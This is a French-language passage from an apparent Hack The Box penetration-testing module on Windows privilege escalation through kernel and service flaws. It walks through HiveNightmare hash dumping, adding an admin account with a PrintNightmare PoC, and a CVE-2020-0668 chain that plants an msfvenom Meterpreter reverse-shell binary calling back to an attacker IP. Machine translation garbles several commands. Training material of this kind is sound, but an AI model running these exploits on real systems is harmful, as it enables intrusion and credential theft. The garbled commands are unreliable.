Exploits du noyau
===============

* * * * *

S'assurer que tous les postes de travail et serveurs des utilisateurs sont mis à jour est un défi de taille, et une conformité à 100 % pour tous les ordinateurs avec des correctifs de sécurité n'est probablement pas un objectif réalisable. En supposant qu'un ordinateur a été ciblé pour l'installation de mises à jour, par exemple, à l'aide de SCCM (Microsoft System Center Configuration Manager) ou WSUS (Windows Server Update Services), il existe encore de nombreuses raisons pour lesquelles l'installation peut échouer. Au fil des ans, de nombreux exploits du noyau ont affecté le système d'exploitation Windows, de Windows 2000/XP à Windows 10/Server 2016/2019. Vous trouverez ci-dessous un tableau détaillé des exploits connus d'exécution de code à distance/d'élévation de privilèges locaux pour les systèmes d'exploitation Windows, ventilés par niveau de service pack, de Windows XP à Server 2016.

| Système d'exploitation de base | XP | | | | 2003 | | | Vue | | | 2008 | | 7 | | 2008R2 | | 8 | 8.1 | 2012 | 2012R2 | 10 | 2016 |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Pack de services | SP0 | SP1 | SP2 | SP3 | SP0 | SP1 | SP2 | SP0 | SP1 | SP2 | SP0 | SP2 | SP0 | SP1 | SP0 | SP1 | | | | | | |
| MS03-026 | - | - | - | - | - | - | - | | | | | | | | | | | | | | | |
| MS05-039 | - | - | - | | - | - | | | | | | | | | | | | | | | | |
| MS08-025 | - | - | - | | - | - | - | - | - | | - | | | | | | | | | | | |
| MS08-067 | - | - | - | - | - | - | - | - | - | | - | | | | | | | | | | | |
| MS08-068 | - | - | - | - | - | - | - | - | - | | - | | | | | | | | | | | |
| MS09-012 | - | - | - | - | - | - | - | - | - | | - | | | | | | | | | | | |
| MS09-050 | | | | | | | | - | - | - | - | - | | | | | | | | | | |
| MS10-015 | | | - | - | - | - | - | - | - | - | | | | | | | | | | | | |
| MS10-059 | | | | | | | | - | - | - | - | - | - | | - | | | | | | | |
| MS10-092 | | | | | | | | - | - | - | - | - | - | | - | | | | | | | |
| MS11-011 | | | | - | - | - | - | - | - | - | - | - | - | | - | | | | | | | |
| MS11-046 | | | | - | - | - | - | - | - | - | - | - | - | - | - | - | | | | | | |
| MS11-062 | | | | - | - | - | - | | | | | | | | | | | | | | | |
| MS11-080 | | | | - | - | - | - | | | | | | | | | | | | | | | |
| MS13-005 | | | | | | | | - | - | - | - | - | - | - | - | - | - | | - | | | |
| MS13-053 | | | | - | - | - | - | - | - | - | - | - | - | - | - | - | - | | - | | | |
| MS13-081 | | | - | - | - | - | - | - | - | - | - | - | - | - | - | - | - | | - | | | |
| MS14-002 | | | | - | - | - | - | | | | | | | | | | | | | | | |
| MS14-040 | | | | | - | - | - | - | - | - | - | - | - | - | - | - | - | - | - | - | | |
| MS14-058 | | | | | - | - | - | - | - | - | - | - | - | - | - | - | - | - | - | - | | |
| MS14-062 | | | | | - | - | - | | | | | | | | | | | | | | | |
| MS14-068 | | | | | - | - | - | - | - | - | - | - | - | - | - | - | - | - | - | - | | |
| MS14-070 | | | | | - | - | - | | | | | | | | | | | | | | | |
| MS15-001 | | | | | | | | | | | | | - | - | - | - | - | - | - | - | | |
| MS15-010 | | | | | - | - | - | - | - | - | - | - | - | - | - | - | - | - | - | - | | |
| MS15-051 | | | | | - | - | - | - | - | - | - | - | - | - | - | - | - | - | - | - | | |
| MS15-061 | | | | | - | - | - | - | - | - | - | - | - | - | - | - | - | - | - | - | | |
| MS15-076 | | | | | - | - | - | - | - | - | - | - | - | - | - | - | - | - | - | - | | |
| MS15-078 | | | | | | | | - | - | - | - | - | - | - | - | - | - | - | - | - | | |
| MS15-097 | | | | | | | | - | - | - | - | - | - | - | - | - | - | - | - | - | - | |
| MS16-016 | | | | | | | | - | - | - | - | - | - | - | - | - | | | | | | |
| MS16-032 | | | | | | | | - | - | - | - | - | - | - | - | - | | - | - | - | | |
| MS16-135 | | | | | | | | - | - | - | - | - | - | - | - | - | | - | - | - | - | - |
| MS17-010 | | | | | | | | - | - | - | - | - | - | - | - | - | - | - | - | - | - | - |
| CVE-2017-0213 : marshaleur d'agrégats COM | | | | | | | | | | | | | - | - | - | - | - | - | - | - | - | - |
| Patate Chaude | | | | | | | | | | | | | - | - | - | - | - | - | - | - | - | |
| Pomme de terre écrasée | | | | | | | | | | | | | - | - | - | - | - | - | - | - | - | |

Remarque : Ce tableau n'est pas complet à 100 % et ne dépasse pas 2017. À ce jour, il existe davantage de vulnérabilités connues pour les nouvelles versions du système d'exploitation et même Server 2019.

Ce [site](https://msrc.microsoft.com/update-guide/vulnerability) est pratique pour rechercher des informations détaillées sur les failles de sécurité de Microsoft. Cette base de données contient 4 733 vulnérabilités de sécurité saisies au moment de la rédaction, montrant l'attaque massive surface que présente un environnement Windows.

Comme nous pouvons le voir dans ce tableau, de nombreux exploits fonctionnent pour Windows XP jusqu'à Server 2012R2. À mesure que nous arrivons à Windows 10 et Server 2016, il y a moins d'exploits connus. Cela est en partie dû aux modifications apportées au système d'exploitation au fil du temps, y compris les améliorations de sécurité et la dépréciation des anciennes versions de protocoles tels que SMB. Une chose importante à noter dans ce tableau est que lorsque de nouvelles vulnérabilités sont découvertes ou que des exploits sont publiés (tels que MS17-010), ceux-ci se répercutent généralement et affectent les versions antérieures du système d'exploitation. C'est pourquoi il est essentiel de rester au courant des correctifs ou de la mise à niveau, du retrait ou de la séparation des systèmes Windows qui ont atteint la fin de leur vie. Nous explorerons cela plus en profondeur plus tard dans ce module.

Il est important de noter que même si certains des exemples ci-dessus "sont" des vulnérabilités d'exécution de code à distance, nous pouvons tout aussi facilement les utiliser pour élever les privilèges. Par exemple, si nous accédons à un système et remarquons un port tel que 445 (service SMB) non accessible de l'extérieur, nous pouvons être en mesure d'augmenter les privilèges s'il est vulnérable à quelque chose comme EternalBlue (MS17-010). Dans ce cas, nous pourrions soit rediriger le port en question pour qu'il soit accessible depuis notre hôte d'attaque, soit exécuter l'exploit en question localement pour élever les privilèges.

* * * * *

Vulnérabilités notables
------------------------

Au fil des ans, il y a eu de nombreuses vulnérabilités Windows à fort impact qui peuvent être exploitées pour élever les privilèges, certaines étant des vecteurs d'escalade de privilèges purement locaux et d'autres étant des failles d'exécution de code à distance (RCE) qui peuvent être utilisées pour élever les privilèges en transférant un port local. . Un exemple de ce dernier serait d'atterrir sur une boîte qui n'autorise pas l'accès au port 445 de l'extérieur, d'effectuer une redirection de port pour accéder à ce port depuis notre boîte d'attaque et d'exploiter une faille d'exécution de code à distance contre le service SMB pour élever les privilèges. Vous trouverez ci-dessous quelques vulnérabilités Windows à très fort impact au fil des ans qui peuvent être exploitées pour augmenter les privilèges.

`MS08-067` - Il s'agissait d'une vulnérabilité d'exécution de code à distance dans le service "Serveur" en raison d'une mauvaise gestion des requêtes RPC. Cela affectait Windows Server 2000, 2003 et 2008 ainsi que Windows XP et Vista et permettait à un attaquant non authentifié d'exécuter du code arbitraire avec les privilèges SYSTEM. Bien que généralement rencontré dans les environnements clients en tant que vulnérabilité d'exécution de code à distance, nous pouvons atterrir sur un hôte où le service SMB est bloqué via le pare-feu. Nous pouvons l'utiliser pour augmenter les privilèges après avoir redirigé le port 445 vers notre boîte d'attaque. Bien qu'il s'agisse d'une vulnérabilité "héritée", je vois toujours cette fenêtre apparaître de temps en temps dans les grandes organisations, en particulier celles de l'industrie médicale qui peuvent exécuter des applications spécifiques qui ne fonctionnent que sur les anciennes versions de Windows Server/Desktop. Nous ne devons pas négliger les vulnérabilités plus anciennes, même en 2021. Nous rencontrerons tous les scénarios sous le soleil lors de l'évaluation des clients et nous devons être prêts à prendre en compte toutes les possibilités. La boîte [Legacy](https://0xdf.gitlab.io/2019/02/21/htb-legacy.html) sur la plateforme Hack The Box présente cette vulnérabilité du point de vue de l'exécution de code à distance. Il existe une version autonome ainsi qu'une version Metasploit de cet exploit.

`MS17-010` - Également connu sous le nom [EternalBlue](https://en.wikipedia.org/wiki/EternalBlue) est une vulnérabilité d'exécution de code à distance qui faisait partie de la boîte à outils FuzzBunch publiée dans [Shadow Brokers](https: //en.wikipedia.org/wiki/The_Shadow_Brokers) fuite. Cet exploit exploite une vulnérabilité du protocole SMB, car le protocole SMBv1 gère mal les paquets spécialement conçus par un attaquant, entraînant l'exécution de code arbitraire sur l'hôte cible en tant que compte SYSTEM. Comme avec MS08-067, cette vulnérabilité peut également être exploitée comme vecteur d'escalade de privilèges local si nous atterrissons sur un hôte où le port 445 est protégé par un pare-feu. Il existe différentes versions de cet exploit pour Metasploit Framework ainsi que des scripts d'exploit autonomes. Cette attaque a été présentée dans la boîte [Blue](https://0xdf.gitlab.io/2021/05/11/htb-blue.html) sur Hack The Box, toujours d'un point de vue distant.

`ALPC Task Scheduler 0-Day` - La méthode de point de terminaison ALPC utilisée par le service Windows Task Scheduler peut être utilisée pour écrire des DACL arbitraires dans `.job` fichiers situés dans le `C:\Windows\tasks` répertoire. Un attaquant pourrait en tirer parti pour créer un lien physique vers un fichier qu'il contrôle. L'exploit de cette faille a utilisé la fonction API [SchRpcSetSecurity](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/a8172c11-a24a-4ad9-abd0-82bcf29d794d?redirectedfrom=MSDN) pour appelez un travail d'impression à l'aide de l'imprimante XPS et détournez la DLL en tant que NT AUTHORITY\SYSTEM via le service Spooler. Une description détaillée est disponible [ici](https://blog.grimm-co.com/2020/05/alpc-task-scheduler-0-day.html). La boîte Hack The Box [Hackback](https://snowscan.io/htb-writeup-hackback/) peut être utilisée pour essayer ce privilège esexploit de calation.

L'été 2021 a révélé un trésor de nouvelles failles d'exécution de code à distance et d'élévation de privilèges locales liées à Windows et Active Directory pour le plus grand plaisir des testeurs d'intrusion (et des attaquants du monde réel), et je suis sûr que nos collègues qui travaillent dur sur le côté défensif des choses.

`CVE-2021-36934 HiveNightmare, alias SeriousSam` est une faille de Windows 10 qui donne à TOUT utilisateur le droit de lire le registre Windows et d'accéder aux informations sensibles, quel que soit son niveau de privilège. Les chercheurs ont rapidement développé un exploit PoC pour permettre la lecture des ruches de registre SAM, SYSTEM et SECURITY et en créer des copies pour les traiter ultérieurement hors ligne et extraire les hachages de mot de passe (y compris l'administrateur local) à l'aide d'un outil tel que SecretsDump.py. Vous trouverez plus d'informations sur cette faille [ici](https://doublepulsar.com/hivenightmare-aka-serioussam-anybody-can-read-the-registry-in-windows-10-7a871c465fa5) et [ceci](https ://github.com/GossiTheDog/HiveNightmare/raw/master/Release/HiveNightmare.exe) l'exploit binaire peut être utilisé pour créer des copies des trois fichiers dans notre répertoire de travail. Ce [script](https://github.com/GossiTheDog/HiveNightmare/blob/master/Mitigation.ps1) peut être utilisé pour détecter la faille et également résoudre le problème d'ACL. Nous allons jeter un coup d'oeil.

#### Vérification des autorisations sur le fichier SAM

Nous pouvons rechercher cette vulnérabilité à l'aide de `icacls` pour vérifier les autorisations sur le fichier SAM. Dans notre cas, nous avons une version vulnérable car le fichier est lisible par le groupe `BUILTIN\Users` .

Vérification des autorisations sur le fichier SAM

```
C:\htb> icacls c:\Windows\System32\config\SAM

C:\Windows\System32\config\SAM BUILTIN\Administrateurs :(I)(F)
                                AUTORITÉ NT\SYSTÈME :(I)(F)
                                INTÉGRÉ\Utilisateurs :(I)(RX)
                                AUTORITÉ DU PACKAGE D'APPLICATION\TOUS LES PACKAGES D'APPLICATION :(I)(RX)
                                AUTORITÉ DU PACKAGE D'APPLICATION\TOUS LES PACKAGES D'APPLICATION RESTREINTS :(I)(RX)

Traitement réussi de 1 fichiers ; Échec du traitement de 0 fichiers

```

Une exploitation réussie nécessite également la présence d'un ou plusieurs clichés instantanés. La `protection du système` est activée par défaut sur la plupart des systèmes Windows 10, ce qui créera des sauvegardes périodiques, y compris le cliché instantané nécessaire pour exploiter cette faille.

#### Attaque et analyse des hachages de mot de passe

Ce [PoC](https://github.com/cube0x0/CVE-2021-36934) par [@cube0x0](https://twitter.com/cube0x0) peut être utilisé pour effectuer l'intégralité de l'attaque, y compris le vidage du NTLM hachages de la base de données SAM, directement dans la console.

Attaque et analyse des hachages de mot de passe

```
PS C:\htb> .\CVE-2021-36934.exe

[*] SAM : \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\system32\config\sam
[*] SYSTÈME : \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\system32\config\system
[*] SÉCURITÉ : \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\system32\config\security
[*] Copie de fichiers vers C:\windows\temp\
[*] Hachages SAM
Administrateur :500 :aad3b435b51404eeaad3b435b51404ee :7796ee39fd3a9c3a1844556115ae1a54
Invité :501 :aad3b435b51404eeaad3b435b51404ee :31d6cfe0d16ae931b73c59d7e0c089c0
Compte par défaut : 503 : aad3b435b51404eeaad3b435b51404ee : 31d6cfe0d16ae931b73c59d7e0c089c0
Compte utilitaire WDAG : 504 : aad3b435b51404eeaad3b435b51404ee : c93428723187f868ae2f99d4fa66dceb
htb-étudiant:1002:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6
[*] Informations de connexion au domaine mises en cache (domaine/nom d'utilisateur : hachage)
[*] Secrets LSA
[*] SYSTÈME_DPAPI
dpapi_machinekey:3c7b7e66890fb2181a74bb56ab12195f248e9461
dpapi_userkey:c3e6491e75d7cffe8efd40df94d83cba51832a56
[*] NL$KM
NL$KM:45c5b232298b05b8e7e7e04b2c148302ce2fe7d9b8e0f0f820c8e470ddd17f4f422ce69eaf5774010988b378173f8854528f8d9c0636c02443b9d80f35 88b960

[*] Nettoyer..

```

`CVE-2021-1675/CVE-2021-34527 PrintNightmare` est une faille dans [RpcAddPrinterDriver](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/f23a7519-1c77-4069- 9ace-a6d8eae47c22) qui est utilisé pour permettre l'impression à distance et l'installation du pilote. Cette fonction est destinée à donner aux utilisateurs disposant du privilège Windows `SeLoadDriverPrivilege` la possibilité d'ajouter des pilotes à un spouleur d'impression distant. Ce droit est généralement réservé aux utilisateurs du groupe Administrateurs intégré et aux Opérateurs d'impression qui peuvent avoir un besoin légitime d'installer à distance un pilote d'imprimante sur la machine d'un utilisateur final. La faille permettait à tout utilisateur authentifié d'ajouter un pilote d'impression à un système Windows sans avoir le privilège mentionné ci-dessus, permettant à un attaquant d'exécuter du code à distance complet en tant que SYSTEM sur n'importe quel système affecté. La faille affecte toutes les versions prises en charge de Windows, et étant donné que le spouleur d'impression s'exécute par défaut sur les contrôleurs de domaine, Windows 7 et 10, et est souvent activé sur les serveurs Windows, cela présente une surface d'attaque massive, d'où un "cauchemar". Microsoft a initialement publié un correctif qui ne résolvait pas le problème (et les premiers conseils consistaient à désactiver le service Spooler, ce qui n'est pas pratique pour de nombreuses organisations), mais a publié un deuxième [patch](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527) en juillet 2021, ainsi que des conseils pour vérifier que des paramètres de registre spécifiques sont définis sur `0` ou non définis. Une fois cette vulnérabilité rendue publique, les exploits PoC ont été diffusés assez rapidement. [Cette](https://github.com/cube0x0/CVE-2021-1675) version de [@cube0x0](https://twitter.com/cube0x0) peut être utilisée pour exécuter une DLL malveillante à distance ou localement à l'aide d'un version modifiée d'Impacket. Le dépôt contient également une implémentation C#. Cette [implémentation de PowerShell](https://github.com/calebstewart/CVE-2021-1675) peut être utilisée pour une élévation rapide des privilèges locaux. Par défaut, ce script ajoute un nouvel utilisateur administrateur local, mais nous pouvons également fournir une DLL personnalisée pour obtenir un shell inversé ou similaire si l'ajout d'un utilisateur administrateur local n'est pas prévu.

#### Vérification du service de spouleur

Nous pouvons vérifier rapidement si le service Spooler est en cours d'exécution avec la commande suivante. S'il n'est pas en cours d'exécution, nous recevrons une erreur "Le chemin n'existe pas".

Vérification du service de spouleur

```
PS C:\htb> ls \\localhost\pipe\spoolss

     Répertoire : \\localhost\pipe

Mode LastWriteTime Longueur Nom
---- ------------- ------ ----
                                                   bobines

```

#### Ajout d'un administrateur local avec PrintNightmare PowerShell PoC

Commencez par [contourner](https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy/) la stratégie d'exécution sur la cible héberger:

Ajout d'un administrateur local avec PrintNightmare PowerShell PoC

```
PS C:\htb> Set-ExecutionPolicy Bypass -Scope Process

Modification de la politique d'exécution
La politique d'exécution vous protège des scripts auxquels vous ne faites pas confiance. La modification de la stratégie d'exécution peut exposer
aux risques de sécurité décrits dans la rubrique d'aide about_Execution_Policies à l'adresse
https://go.microsoft.com/fwlink/?LinkID=135170. Voulez-vous changer la politique d'exécution ?
[O] Oui [A] Oui à tous [N] Non [L] Non à tous [S] Suspendre [?] Aide (la valeur par défaut est "N") : A

```

Nous pouvons maintenant importer le script PowerShell et l'utiliser pour ajouter un nouvel utilisateur administrateur local.

Ajout d'un administrateur local avec PrintNightmare PowerShell PoC

```
PS C:\htb> Import-Module .\CVE-2021-1675.ps1
PS C:\htb> Invoke-Nightmare -NewUser "hacker" -NewPassword "Pwnd1234!" -Nom du pilote "PrintIt"

[+] a créé la charge utile sur C:\Users\htb-student\AppData\Local\Temp\nightmare.dll
[+] en utilisant pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_am
d64_ce3301b66255a0fb\Amd64\mxdwdrv.dll"
[+] hacker utilisateur ajouté en tant qu'administrateur local
[+] suppression de la charge utile de C:\Users\htb-student\AppData\Local\Temp\nightmare.dll

```

#### Confirmation du nouvel utilisateur administrateur

Si tout se passe comme prévu, nous aurons un nouvel utilisateur administrateur local sous notre contrôle. L'ajout d'un utilisateur est "bruyant", nous ne voudrions pas faire cela sur un engagement où la furtivité est une considération. De plus, nous voudrions vérifier auprès de notre client pour nous assurer que la création de compte est dans le champ de l'évaluation.

Confirmation du nouvel utilisateur administrateur

```
PS C:\htb> hacker de l'utilisateur du net

Pirate de nom d'utilisateur
Pirate de nom complet
Commentaire
Commentaire de l'utilisateur
Code pays/région 000 (valeur par défaut du système)
Compte actif Oui
Le compte expire Jamais

Mot de passe défini pour la dernière fois ?8/?9/?2021 12:12:01 PM
Le mot de passe expire Jamais
Mot de passe modifiable ?8/?9/?2021 12:12:01 PM
Mot de passe requis Oui
L'utilisateur peut changer de mot de passe Oui

Postes de travail autorisés Tous
Script de connexion
Profil de l'utilisateur
Répertoire d'accueil
Dernière connexion Jamais

Heures de connexion autorisées Tous

Adhésions aux groupes locaux *Administrateurs
Adhésions au groupe mondial *Aucun
La commande s'est terminée avec succès.

```

Il s'agit d'un petit échantillon de certaines des vulnérabilités les plus impactantes. S'il est impératif pour nous de comprendre et de pouvoir énumérer et exploiter ces vulnérabilités, il est également important de pouvoir détecter et exploiter les failles moins connues.

* * * * *

Énumération des correctifs manquants
---------------------------

La première étape consiste à examiner les mises à jour installées et à tenter de trouver les mises à jour qui ont pu être manquées, ouvrant ainsi une voie d'attaque pour nous.

#### Examen des mises à jour installées

Nous pouvons examiner les mises à jour installées de plusieurs manières. Vous trouverez ci-dessous trois commandes distinctes que nous pouvons utiliser.

Examen des mises à jour installées

```
PS C:\htb> informations système
PS C:\htb> résumé de la liste qfe wmic
PS C:\htb> Get-Hotfix

```

#### Affichage des mises à jour installées avec WMI

Affichage des mises à jour installées avec WMI

```
C:\htb> résumé de la liste wmic qfe

Description FixComments HotFixID InstallDate InstalledBy InstalledOn Nom ServicePackInEffect État
Mise à jour KB4601056 NT AUTORITY\SYSTEM 3/27/2021
Mise à jour KB4513661 09/01/2020
Mise à jour de sécurité KB4516115 09/01/2020
Mise à jour KB451724509/01/2020
Mise à jour de sécurité KB4528759 09/01/2020
Mise à jour de sécurité KB4535680 NT AUTHORITY\SYSTEM 3/27/2021
Mise à jour de sécurité KB4580325 NT AUTHORITY\SYSTEM 3/27/2021
Mise à jour de sécurité KB5000908 NT AUTHORITY\SYSTEM 3/27/2021
Mise à jour de sécurité KB5000808 NT AUTHORITY\SYSTEM 3/27/2021

```

Nous pouvons rechercher chaque KB (numéro d'identification de la base de connaissances Microsoft) dans [Microsoft Update Catalog](https://www.catalog.update.microsoft.com/Search.aspx?q=KB5000808) pour avoir une meilleure idée de ce les correctifs ont été installés et à quel point le système peut être en retard sur les mises à jour de sécurité. Une recherche de `KB5000808` nous montre qu'il s'agit d'une mise à jour de mars 2021, ce qui signifie que le système est probablement très en retard sur les mises à jour de sécurité.

* * * * *

Exemple CVE-2020-0668
---------------------

Ensuite, exploitons [Microsoft CVE-2020-0668 : Windows Kernel Elevation of Privilege Vulnerability](https://itm4n.github.io/cve-2020-0668-windows-service-tracing-eop/), qui exploite un arbitraire vulnérabilité de déplacement de fichier exploitant le traçage de service Windows. Service Tracing permet aux utilisateurs de résoudre les problèmes d'exécution des services et des modules en générant des informations de débogage. Ses paramètres sont configurables à l'aide du registre Windows. La définition d'une valeur MaxFileSize personnalisée inférieure à la taille du fichier invite le fichier à être renommé avec une extension `.OLD` lorsque le service est déclenché. Cette opération de déplacement est effectuée par `NT AUTHORITY\SYSTEM` et peut être utilisée de manière abusive pour déplacer un fichier de notre choix à l'aide de points de montage et de liens symboliques.

#### Vérification des privilèges utilisateur actuels

Vérifions les privilèges de notre utilisateur actuel.

Vérification des privilèges utilisateur actuels

```
C:\htb> whoami /priv

INFORMATIONS SUR LES PRIVILÈGES
----------------------

Nom du privilège Description État
================================================= =============== ========
SeShutdownPrivilege Arrêter le système Désactivé
SeChangeNotifyPrivilege Bypass traverse la vérification activée
SeUndockPrivilege Supprimer l'ordinateur de la station d'accueil Désactivé
SeIncreaseWorkingSetPrivilege Augmenter un ensemble de travail de processus Désactivé
SeTimeZonePrivilege Changer le fuseau horaire Désactivé

```

#### Après la construction de la solution

Nous pouvons utiliser [cet](https://github.com/RedCursorSecurityConsulting/CVE-2020-0668) exploit pour CVE-2020-0668, le télécharger et l'ouvrir dans Visual Studio au sein d'une machine virtuelle. La construction de la solution doit créer les fichiers suivants.

Après la construction de la solution

```
CVE-2020-0668.exe
CVE-2020-0668.exe.config
CVE-2020-0668.pdb
NtApiDotNet.dll
NtApiDotNet.xml

```

À ce stade, nous pouvons utiliser l'exploit pour créer un fichier de notre choix dans un dossier protégé tel que C:\Windows\System32. Nous ne sommes pas en mesure d'écraser les fichiers Windows protégés. Cette écriture de fichier privilégiée doit être enchaînée avec une autre vulnérabilité, telle que [UsoDllLoader](https://github.com/itm4n/UsoDllLoader) ou [DiagHub](https://github.com/xct/diaghub) pour charger le DLL et élever nos privilèges. Cependant, la technique UsoDllLoader peut ne pas fonctionner si des mises à jour Windows sont en attente ou en cours d'installation, et le service DiagHub peut ne pas être disponible.

Nous pouvons également rechercher tout logiciel tiers pouvant être exploité, tel que le service de maintenance Mozilla. Ce service s'exécute dans le contexte de SYSTEM et peut être démarré par des utilisateurs non privilégiés. Le binaire (non protégé par le système) de ce service se trouve ci-dessous.

- `C:\Program Files (x86)\Service de maintenance Mozilla\maintenanceservice.exe`

#### Vérification des autorisations sur le binaire

`icacls` confirme que nous n'avons que des autorisations de lecture et d'exécution sur ce binaire en fonction de la ligne `BUILTIN\Users :(I)(RX)` dans la sortie de la commande.

Vérification des autorisations sur le binaire

```
C:\htb> icacls "c:\Program Files (x86)\Service de maintenance Mozilla\maintenanceservice.exe"

C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe NT AUTHORITY\SYSTEM:(I)(F)
                                                                           INTÉGRÉ\Administrateurs :(I)(F)
                                                                           INTÉGRÉ\Utilisateurs :(I)(RX)
                                                                           AUTORITÉ DU PACKAGE D'APPLICATION\TOUS LES PACKAGES D'APPLICATION :(I)(RX)
                                                                           AUTORITÉ DU PACKAGE D'APPLICATION\TOUS LES PACKAGES D'APPLICATION RESTREINTS :(I)(RX)

Traitement réussi de 1 fichiers ; Échec du traitement de 0 fichiers

```

#### Génération d'un binaire malveillant

Générons un binaire `maintenanceservice.exe` malveillant qui peut être utilisé pour obtenir une connexion shell inversée Meterpreter à partir de notre cible.

Génération de binaires malveillants

```
dsgsec@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.3 LPORT=8443 -f exe > maintenanceservice.exe

[-] Aucune plate-forme n'a été sélectionnée, en choisissant Msf::Module::Platform::Windows à partir de la charge utile
[-] Aucune arche sélectionnée, sélection de l'arche : x64 à partir de la charge utile
Aucun encodeur spécifié, sortie de données utiles brutes
Taille de la charge utile : 645 octets
Taille finale du fichier exe : 7168 octets

```

#### Hébergement du binaire malveillant

Nous pouvons le télécharger sur la cible à l'aide de cURL après avoir démarré un serveur HTTP Python sur notre hôte d'attaque, comme dans la section `Contrôle de compte d'utilisateur` précédemment. Nous pouvons également utiliser wget de la cible.

Hébergement du binaire malveillant

```
dsgsec@htb[/htb]$ $ python3 -m http.serveur 8080

Serveur HTTP sur le port 0.0.0.0 8080 (http://0.0.0.0:8080/) ...
10.129.43.13 - - [01/Mars/2022 18:17:26] "GET /maintenanceservice.exe HTTP/1.1" 200 -
10.129.43.13 - - [01/Mar/2022 18:17:45] "GET /maintenanceservice.exe HTTP/1.1" 200 -

```

#### Téléchargement du binaire malveillant

Pour cette étape, nous devons faire deux copies du fichier .exe malveillant. Nous pouvons simplement le tirer deux fois ou le faire une fois et faire une deuxième copie.

Nous devons le faire car l'exécution de l'exploit corrompt la version malveillante de `maintenanceservice.exe` qui est déplacée vers (notre copie dans `c:\Users\htb-student\Desktop` que nous ciblons) `c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe` dont nous devrons tenir compte ultérieurement. Si nous essayons d'utiliser la version copiée, nous recevrons une `erreur système 216` car le fichier .exe n'est plus un fichier binaire valide.

Téléchargement du binaire malveillant

```
PS C:\htb> wget http://10.10.15.244:8080/maintenanceservice.exe -O maintenanceservice.exe
PS C:\htb> wget http://10.10.15.244:8080/maintenanceservice.exe -O maintenanceservice2.exe

```

#### Exécution de l'exploit

Ensuite, lançons l'exploit. Il accepte deux arguments, les fichiers source et destination.

Lancer l'exploit

```
C:\htb> C:\Tools\CVE-2020-0668\CVE-2020-0668.exe C:\Users\htb-student\Desktop\maintenanceservice.exe "C:\Program Files (x86)\Mozilla Maintenance Service \maintenanceservice.exe"

[+] Déplacement de C:\Users\htb-student\Desktop\maintenanceservice.exe vers C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe

[+] Montage de \RPC Control sur C:\Users\htb-student\AppData\Local\Temp\nzrghuxz.leo
[+] Création de liens de symboles
[+] Mise à jour de la configuration HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Tracing\RASPLAP.
[+] Dormir pendant 5 secondes pour que les changements prennent effet
[+] Écriture du fichier d'annuaire sur C:\Users\htb-student\AppData\Local\Temp\179739c5-5060-4088-a3e7-57c7e83a0828.pbk
[+] Nettoyage
[+] C'est fait !

```

#### Vérification des autorisations du nouveau fichier

L'exploit s'exécute et l'exécution de `icacls` affiche à nouveau l'entrée suivante pour notre utilisateur : `WINLPE-WS02\htb-student:(F)`. Cela signifie que notre utilisateur htb-student a un contrôle total sur le binaire maintenanceservice.exe, et nous pouvons le remplacer par une version non corrompue de notre binaire malveillant.

Vérification des autorisations du nouveau fichier

```
C:\htb> icacls 'C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe'

C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe NT AUTHORITY\SYSTEM:(F)
                                                                           INTÉGRÉ\Administrateurs :(F)
                                                                           WINLPE-WS02\htb-étudiant :(F)

```

#### Remplacement du fichier par un binaire malveillant

Nous pouvons remplacer le `maintenanceservice.exe` binaire dans `c:\Program Files (x86)\Mozilla Maintenance Service` par une bonne copie de travail de notre binaire malveillant créé précédemment avant de démarrer le service. Dans cet exemple, nous avons téléchargé deux copies du binaire malveillant dans `C:\Users\htb-student\Desktop`, `maintenanceservice.exe` et `maintenanceservice2.exe`. Déplaçons la bonne copie qui n'a pas été corrompue par l'exploit `maintenanceservice2.exe` dans le répertoire Program Files, en veillant à renommer le fichier correctement et à supprimer le `2` ou le service ne démarrera pas. La commande `copy` ne fonctionnera qu'à partir d'une fenêtre cmd.exe, pas d'une console PowerShell.

Remplacement d'un fichier par un binaire malveillant

```
C:\htb> copier /Y C:\Users\htb-student\Desktop\maintenanceservice2.exe "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"

         1 fichier(s) copié(s).

```

#### Script de ressource Metasploit

Ensuite, enregistrez les commandes ci-dessous dans un [Resource Script](https://docs.rapid7.com/metasploit/resource-scripts/) fichier nommé `handler.rc`.

Script de ressource Metasploit

```
utiliser exploit/multi/gestionnaire
définir PAYLOAD windows/x64/meterpreter/reverse_https
définir LHOST <notre_ip>
kit LPORT 8443
exploiter

```

#### Lancement de Metasploit avec le script de ressources

Lancez Metasploit en utilisant le fichier Resource Script pour précharger nos paramètres.

Lancer Metasploit avec Resource Script

```
dsgsec@htb[/htb]$ sudo msfconsole -r gestionnaire.rc

          . .
  .

       dBBBBBBb dBBBP dBBBBBBP dBBBBBBb . o
        ' dB' BBP
     dB'dB'dB' dBBP dBP dBP BB
    dB'dB'dB' dBP dBP dBP BB
   dB'dB'dB' dBBBBP dBP dBBBBBBB

                                    dBBBBBP dBBBBBb dBP dBBBBP dBP dBBBBBBP
           . . dB' dBP dB'.BP
                              | dBP dBBBB' dBP dB'.BP dBP dBP
                            --o-- dBP dBP dBP dB'.BP dBP dBP
                              | dBBBBP dBP dBBBBP dBBBBP dBP dBP

                                                                     .
                 .
         o Pour aller audacieusement là où il n'y en a pas
                             shell est passé avant

        =[ metasploit v6.0.9-dev ]
+ -- --=[ 2069 exploits - 1123 auxiliaires - 352 messages ]
+ -- --=[ 592 charges utiles - 45 encodeurs - 10 nops ]
+ -- --=[ 7 évasion ]

